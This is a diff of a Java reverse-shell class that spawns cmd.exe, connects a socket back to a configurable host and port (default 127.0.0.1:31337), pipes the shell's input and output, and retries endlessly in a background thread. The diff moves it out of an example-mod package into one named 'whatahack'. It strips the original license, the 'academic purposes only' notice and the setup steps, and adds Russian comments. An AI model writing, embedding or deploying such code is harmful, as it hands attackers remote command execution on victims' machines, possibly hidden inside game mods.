@@ -1,52 +1,10 @@
-package com.example.examplemod;
-
-import tv.twitch.broadcast.IngestList;
+package org.pyfffe.whatahack;
 
 import java.net.Socket;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-
-/*
- * Copyright 2018 cornerpirate.
- *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- *      http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-/**
- * For academic purposes only.
- *
- * This reverse shell is based pretty much on this gist:
- *
- *   https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
- *
- * 1) Save a copy of this file to your attacker server.
- * 2) Replace "class TCPReverseShell" with "class Payload"
- * 3) Rename the file to "Payload.java"
- * 4) Alter the attacker to your hostname/ip
- * 5) set the port to match your "nc -lvp <port>"
- * 6) Start an HTTP server
- *
- * You can use Apache, Nginx or python as per this blog:
- *
- *   https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/
- *
- * The reason for renaming the class is because it would baffle Stager to
- * have a class called Payload living inside it. That would be ambiguous.
- *
- * @author cornerpirate
- */
-
+// В основе лежит деволтный reverse shell, обернутый в отдельный поток при запуске
 public class ReverseShell extends Thread {
 
     private String targetHost = "127.0.0.1";
@@ -60,10 +18,6 @@ public class ReverseShell extends Thread {
     // Empty stub for method overloading
     public ReverseShell() {}
 
-    /**
-     * This method is called when the payload is compiled and executed. I am
-     * showing a reverse shell here for Windows.
-     */
     public void run() {
         if (targetHost == null){
             targetHost = "127.0.0.1";
@@ -71,9 +25,8 @@ public class ReverseShell extends Thread {
         if (targetPort == null){
             targetPort = 31337;
         }
+        // Бесконечные попытки соединения
         while(true) {
-            // IP address or hostname of attacker
-            // String targetHost = "192.168.1.72";
 
             // For a windows target do this. For linux "/bin/bash"
             String cmd = "cmd.exe";
@@ -103,14 +56,13 @@ public class ReverseShell extends Thread {
                     try {
                         p.exitValue();
                         break;
-                    } catch (Exception e) {
+                    } catch (Exception ignored) {
                     }
                 }
                 p.destroy();
                 s.close();
                 break;
             } catch (Exception ex) {
-                // Ignore errors as we are doing naughty things anyway.
                 System.out.println("Cant connect to " + targetHost + ":" + Integer.toString(targetPort) + ", retrying...");
             }
         }
